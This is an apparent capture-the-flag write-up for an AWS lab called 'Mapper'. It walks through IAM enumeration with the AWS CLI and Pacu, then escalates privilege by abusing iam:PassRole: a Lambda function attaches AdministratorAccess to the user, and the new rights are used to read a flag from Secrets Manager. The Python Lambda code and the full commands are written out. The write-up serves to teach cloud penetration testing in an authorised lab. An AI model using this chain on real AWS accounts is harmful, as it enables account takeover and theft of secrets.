# Challenge Lab Name: `Mapper`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://www.hacksmarter.org/" target="_blank" title="Open Hack Smarter Platform"><img src="https://img.shields.io/badge/Hack_Smarter_↗-181717?style=flat&logo=hacksmarter&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Hack Smarter Platform Link"></a> &nbsp;
>
> Objective
>You have been hired to perform an AWS pentest against a client's account. They have requested you perform a full audit of all the IAM Users and identify any possible privilege escalation paths. To demonstrate impact, they have put a flag in the Secrets Manager that is only available to Administrators.
>
>Initial Access
>The client has provided you with an Access Key and Secret for the starting user. Additionally, this starting user can create Access Keys and Secrets for any IAM User in the account. If you find a privesc path, create credentials for that user and demonstrate impact.

</details>

## Detailed Methodology

<details open>
<summary><b>Initial Access</b></summary>

The initial access given were credentials for an IAM user `cg-pentest-lab`. This user had permission to create an access key and secret access key for any IAM user in the AWS account. 

```bash
└─$ aws sts get-caller-identity --profile mapper
{
    "UserId": "AIDAUEV5DVUJ3NZKGF5CK",
    "Account": "284938186003",
    "Arn": "arn:aws:iam::284938186003:user/cg-pentest-lab"
}
```

Running the command above I could see that the IAM user is `cg-pentest-lab`. 

### Policy Enumeration for `cg-pentest-lab`

Although the challenge overview mentioned the permissions that this IAM user had I went ahead and still checked the policies attached to it. 

#### Inline Policies

When checking the inline policies for the IAM user `cg-pentest-lab` I could see that there was a policy attached. 

```bash
└─$ aws iam list-user-policies --user-name cg-pentest-lab --profile mapper 
{
    "PolicyNames": [
        "cg-pentest-create-access-key-lab"
    ]
}
```

After finding the inline policy name attached to the current user, I view the document by running the command below:

```bash
└─$ aws iam get-user-policy --policy-name cg-pentest-create-access-key-lab --user-name cg-pentest-lab --profile mapper
{
    "UserName": "cg-pentest-lab",
    "PolicyName": "cg-pentest-create-access-key-lab",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "iam:CreateAccessKey",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::*:user/*"
            }
        ]
    }
}
```

I could see that the inline policy allowed the IAM user `cg-pentest-lab` to create an access key for any user in the AWS account (like the lab overview mentioned).

#### Managed Policies

I then went ahead and checked the managed policies attached to the IAM user `cg-pentest-lab` running the command below:

```bash
└─$ aws iam list-attached-user-policies --user-name cg-pentest-lab --profile mapper
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
```

The output of the command let me know that the IAM user `cg-pentest-lab` had permission to read all IAM permissions. 

```bash
└─$ aws iam get-policy --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --profile mapper
{
    "Policy": {
        "PolicyName": "IAMReadOnlyAccess",
        "PolicyId": "ANPAJKSO7NDY4T57MWDSQ",
        "Arn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Provides read only access to IAM via the AWS Management Console.",
        "CreateDate": "2015-02-06T18:40:39+00:00",
        "UpdateDate": "2018-01-25T19:11:27+00:00",
        "Tags": []
    }
}
```

Reading from the [AWS documentation](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/IAMReadOnlyAccess.html) I could see that the user `cg-pentest-lab` had IAM permissions to use across all resources. 

</details>

<details open>
<summary><b>Enumerating Users & Roles</b></summary>

### List Roles

I decided to first check for any IAM roles in the AWS account by running the command below: 

```bash
└─$  aws iam list-roles --profile mapper
{
    "Roles": [
        {
            "Path": "/aws-service-role/organizations.amazonaws.com/",
            "RoleName": "AWSServiceRoleForOrganizations",
            "RoleId": "AROAUEV5DVUJ5RZYCQJD7",
            "Arn": "arn:aws:iam::284938186003:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations",
            "CreateDate": "2026-07-16T19:22:37+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "organizations.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
:...skipping...
{                                                                                          
    "Roles": [                                                                             
        {                                                                                  
            "Path": "/aws-service-role/organizations.amazonaws.com/",                      
            "RoleName": "AWSServiceRoleForOrganizations",                                  
            "RoleId": "AROAUEV5DVUJ5RZYCQJD7",                                             
            "Arn": "arn:aws:iam::284938186003:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations",                                                      
            "CreateDate": "2026-07-16T19:22:37+00:00",                                     
            "AssumeRolePolicyDocument": {                                                  
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "organizations.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Service-linked role used by AWS Organizations to enable integration of other AWS services with Organizations.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/support.amazonaws.com/",
            "RoleName": "AWSServiceRoleForSupport",
            "RoleId": "AROAUEV5DVUJVBEINDYV2",
            "Arn": "arn:aws:iam::284938186003:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
            "CreateDate": "2026-07-16T19:22:36+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "support.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Enables resource access for AWS to provide billing, administrative and support services",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
            "RoleName": "AWSServiceRoleForTrustedAdvisor",
            "RoleId": "AROAUEV5DVUJRD5KDWOTO",
            "Arn": "arn:aws:iam::284938186003:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
            "CreateDate": "2026-07-16T19:22:36+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "trustedadvisor.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "cg-LambdaAdminExecutionRole-lab",
            "RoleId": "AROAUEV5DVUJUHDIWXXVG",
            "Arn": "arn:aws:iam::284938186003:role/cg-LambdaAdminExecutionRole-lab",
            "CreateDate": "2026-10-19T00:05:50+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "CourseStackAwsLabRole",
            "RoleId": "AROAUEV5DVUJVJELSC3MM",
            "Arn": "arn:aws:iam::284938186003:role/CourseStackAwsLabRole",
            "CreateDate": "2026-07-16T19:22:45+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::662863940582:role/CourseStackAwsLabControlPlane"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CourseStack AWS Cloud Lab deploy/nuke role",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "OrganizationAccountAccessRole",
            "RoleId": "AROAUEV5DVUJ3ZN6KL3QI",
            "Arn": "arn:aws:iam::284938186003:role/OrganizationAccountAccessRole",
            "CreateDate": "2026-07-16T19:22:36+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::992382618926:root"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        }
    ]
}
```

From the command output, what automatically caught my eye was `cg-LambdaAdminExecutionRole-lab` because of the statements attached to the **AssumeRolePolicyDocument**. 

#### Role Found: `cg-LambdaAdminExecutionRole-lab`

From viewing the output of roles I could also see that the `cg-LambdaAdminExecutionRole-lab` allowed the AWS Lambda service to assume the role itself. 

```json
{
            "Path": "/",
            "RoleName": "cg-LambdaAdminExecutionRole-lab",
            "RoleId": "AROAUEV5DVUJUHDIWXXVG",
            "Arn": "arn:aws:iam::284938186003:role/cg-LambdaAdminExecutionRole-lab",
            "CreateDate": "2026-10-19T00:05:50+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },

```

Knowing that the IAM role `cg-LambdaAdminExecutionRole-lab` allows the Lambda service to assume its role I checked to see what policies were attached to the role. 

```bash
└─$ aws iam list-role-policies --role-name cg-LambdaAdminExecutionRole-lab --profile mapper
{
    "PolicyNames": []
}
```

From the command output above I could see that there weren't any inline policies attached, so I checked the managed policies attached to the role by running the command below:

```bash
└─$ aws iam list-attached-role-policies --role-name cg-LambdaAdminExecutionRole-lab --profile mapper
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

Checking the managed policies attached to the IAM role `cg-LambdaAdminExecutionRole-lab` I found that the role had the **AdministratorAccess** policy attached to it. This meant that role was allowed to run any and all commands in the AWS account. 

#### Planned Attack Path 

I now knew that the attack path involved using the IAM role `cg-LambdaAdminExecutionRole-lab` by running the AWS Lambda service. The next step was to find a user that had permission to create and invoke Lambda functions. 

</details>


<details open>
<summary><b>Pacu</b></summary>

Having an attack path in mind, I went ahead and started Pacu to automate finding an IAM user that had the correct permissions to abuse. In this case, I wanted to find an IAM user that had the permission to use the AWS Lambda service, `lambda:*`. 

To find an IAM user to abuse, I needed to run these Pacu modules in order like shown below:
1. **iam__enum_users_roles_policies_groups**
    - > This module requests the info for all users, roles, customer-managed policies, and groups in the account. If no arguments are supplied, it will enumerate all four, if any are supplied, it will enumerate those only.
2. **iam__enum_permissions**
    - > Prerequisite Module(s): `iam__enum_users_roles_policies_groups`
    - > This module will attempt to use IAM APIs to enumerate a confirmed list of IAM permissions for users/roles in the account. By default, the owner of the active set of keys is targeted. This is done by checking attached and inline policies for the user and the groups they are in.
3. **iam__enum_action_query**
    - > Prerequisite Module(s): `iam__enum_permissions`
    - > This module allows you to query IAM permissions for users and roles and see what resources if any they have those permissions on. For example --query s3:get*,iam:create*.

To get the IAM users in the AWS account I went ahead and ran the command below, including the `--users` flag to enumerate for users only, reducing the time the module took to run.
```bash
Pacu (mapper:imported-mapper) > run iam__enum_users_roles_policies_groups --users
  Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 102 users
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  102 Users Enumerated
  IAM resources saved in Pacu database.
```

From the output, I could see that there were 100+ users in the AWS account. Now that the users in the account were enumerated I needed to get their permissions which was done by running the command below, including the `--all-users` flag to only check for the users that were enumerated. 

```bash
Pacu (mapper:imported-mapper) > run iam__enum_permissions --all-users
...
[iam__enum_permissions] MODULE SUMMARY:

  26573 Confirmed permissions for 102 user(s).
      0 Confirmed permissions for 0 role(s).
      0 Unconfirmed permissions for 0 user(s).
      0 Unconfirmed permissions for 0 role(s).
Type 'whoami' to see detailed list of permissions.
```

With the user permissions enumerated, I then used the command below to find a IAM user that had permission to use the Lambda service.

```bash
Pacu (mapper:imported-mapper) > run iam__enum_action_query --query lambda:*
  Running module iam__enum_action_query...
[iam__enum_action_query] (User) cg-ijxryjty-lab can perform lambda:createfunction on these resources:
[iam__enum_action_query] *
[iam__enum_action_query] (User) cg-ijxryjty-lab can perform lambda:invokefunction on these resources:
[iam__enum_action_query] *
...
```

From the module output, I could see that the IAM user `cg-ijxryjty-lab` was allowed to create and invoke lambda functions. Before creating an access key for this user I went ahead and enumerated the policies attached to the user. 

#### User Found: `cg-ijxryjty-lab` 

From the output below I could see that there weren't any managed policies attached to the IAM user `cg-ijxryjty-lab`. 

```bash
└─$ aws iam list-attached-user-policies --user-name cg-ijxryjty-lab --profile mapper
{
    "AttachedPolicies": []
}
```

I then checked to see if there were any inline policies attached to the IAM user and found one shown below. 

```bash
└─$ aws iam list-user-policies --user-name cg-ijxryjty-lab --profile mapper
{
    "PolicyNames": [
        "cg-lambda-developer-policy-lab"
    ]
}
```

Looking further into the inline policy, I noted that not only was the IAM user `cg-ijxryjty-lab` allowed to create and invoke Lambda functions but also pass the role of `cg-LambdaAdminExecutionRole-lab`. 

```bash
└─$ aws iam get-user-policy --policy-name cg-lambda-developer-policy-lab --user-name cg-ijxryjty-lab --profile mapper
{
    "UserName": "cg-ijxryjty-lab",
    "PolicyName": "cg-lambda-developer-policy-lab",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "lambda:CreateFunction",
                    "lambda:InvokeFunction"
                ],
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": "iam:PassRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::284938186003:role/cg-LambdaAdminExecutionRole-lab"
            }
        ]
    }
}
```

From here this meant that I could create a Lambda function that would pass the role of `cg-LambdaAdminExecutionRole-lab` and then invoke the Lambda function after it was created. To take advantage of these permissions I needed to create a Lambda function that would give the IAM user `cg-ijxryjty-lab` **AdministratorAccess**. With all this, I was now confident in creating access keys for the IAM user `cg-ijxryjty-lab`. 

</details>

<details open>
<summary><b>Privilege Escalation</b></summary>

Knowing that the IAM user `cg-pentest-lab` (the initial access credentials) had permission to create access keys I went ahead and created an access key for the IAM user `cg-ijxryjty-lab` by running the command below:

```bash
└─$ aws iam create-access-key --user-name cg-ijxryjty-lab --profile mapper 
{
    "AccessKey": {
        "UserName": "cg-ijxryjty-lab",
        "AccessKeyId": "**************",
        "Status": "Active",
        "SecretAccessKey": "**********************",
        "CreateDate": "2026-10-19T00:22:29+00:00"
    }
}
```

From here, I could create a new AWS profile using the credentials shown in the command output and verify that I was the IAM user `cg-ijxryjty-lab`, which is shown below. 

```bash
└─$ aws sts get-caller-identity --profile cg-ijxryjty-lab
{
    "UserId": "AIDAUEV5DVUJ6H2QZWV5Z",
    "Account": "284938186003",
    "Arn": "arn:aws:iam::284938186003:user/cg-ijxryjty-lab"
}
```

Now that I was the IAM user `cg-ijxryjty-lab` I could create a Lambda function to escalate the user's privileges. 

#### Creating Lambda Function for Privilege Escalation

Originally I tried using a Python script I AI-generated for another lab, but I was getting an error and so I found a script from this [blog](https://t-s3c.de/blog/lambda_privesc/lambda_privesc/) which is shown below:

```python
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    response = iam.attach_user_policy(
        UserName="cg-ijxryjty-lab",
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    return response
```

After copying and pasting the Python script into a file titled `privesc.py` I made sure to ZIP the script by running `zip privesc.zip privesc.py` which created the ZIP file `privesc.zip`. 

Now that the ZIP file was created I could use the AWS CLI to create a Lambda function with the IAM user `cg-ijxryjty-lab`'s permissions which was done running the command below. The function name I chose was `escalate` which would be noted to invoke the function after. 

```bash
└─$ aws lambda create-function --function-name escalate --runtime python3.11 --role arn:aws:iam::284938186003:role/cg-LambdaAdminExecutionRole-lab --handler privesc.lambda_handler --zip-file fileb://privesc.zip --region us-east-1 --profile cg-ijxryjty-lab
{
    "FunctionName": "escalate",
    "FunctionArn": "arn:aws:lambda:us-east-1:284938186003:function:escalate",
    "Runtime": "python3.11",
    "Role": "arn:aws:iam::284938186003:role/cg-LambdaAdminExecutionRole-lab",
    "Handler": "privesc.lambda_handler",
    "CodeSize": 344,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2026-10-19T00:52:46.625+0000",
    "CodeSha256": "x8hDG6H0LB/srfHfkoMa/wrKz38evyvnOO7RPngthms=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "42c58ec8-d306-46a3-ad85-cb96059f1dc3",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    },
    "SnapStart": {

```

From the command output I could see that the Lambda function was successfully created and now I could try and invoke the function, which is shown below. 

```bash
└─$ aws lambda invoke --function-name escalate --profile cg-ijxryjty-lab output.json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

The command output shows that the Lambda function was successfully executed. From here I could go ahead and double check that the **AdministratorAccess** was now attached to the IAM user `cg-ijxryjty-lab` by running the command below. 

```bash
└─$ aws iam list-attached-user-policies --user-name cg-ijxryjty-lab --profile mapper
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

Based off of the command output, the IAM user `cg-ijxryjty-lab` now had admin privileges meaning I could run any command on this AWS account. 

#### Using SecretsManager to Find Secrets

Now to demonstrate impact to the client I needed to check the secrets found in the AWS Secrets Manager, which I did by running the command below. 

```bash
└─$ aws secretsmanager list-secrets --profile cg-ijxryjty-lab 
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:284938186003:secret:cg-admin-flag-lab-tWZiJH",
            "Name": "cg-admin-flag-lab",
            "Description": "Administrative access verification flag",
            "LastChangedDate": "2026-10-18T17:05:58.932000-07:00",
            "LastAccessedDate": "2026-10-18T17:00:00-07:00",
            "SecretVersionsToStages": {
                "terraform-YBraZfCRDpq85tU3bW2p0VWGss": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-10-18T17:05:50.159000-07:00"
        }
    ]
}
```

From the output I could see that there was a secret named `cg-admin-flag-lab`, and so I ran the command below to see its value.  

```bash
└─$ aws secretsmanager get-secret-value --secret-id cg-admin-flag-lab --profile cg-ijxryjty-lab 
{
    "ARN": "arn:aws:secretsmanager:us-east-1:284938186003:secret:cg-admin-flag-lab-tWZiJH",
    "Name": "cg-admin-flag-lab",
    "VersionId": "terraform-YBraZfCRDpq85tU3bW2p0VWGss",
    "SecretString": "HSM{**********}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-10-18T17:05:58.929000-07:00"
}
```

</details>

<details open>
<summary><b>Impact & Post-Exploitation Potential</b></summary>

The initial access given allowed me to create an access key for any user on the AWS account. Starting my enumeration in the AWS CLI I found that there was a IAM role, `cg-LambdaAdminExecutionRole-lab`, which contained a AssumeRolePolicyDocument that stated that the AWS Lambda service could assume its role. I then used Pacu to enumerate users, their permissions, and then query for a user that was allowed to use the Lambda service. From there, I found a IAM user `cg-ijxryjty-lab` and created access keys and then a Lambda function, which when invoked gave that user admin privileges. 

With admin privileges, a company could lose data or take financial loss if an attacker were to withold company data or do a full hostile account takeover. Or something more subtle could be using the company's resources without a proper budgeting alert, and therefore losing the company money short-term or long-term.  
</details>

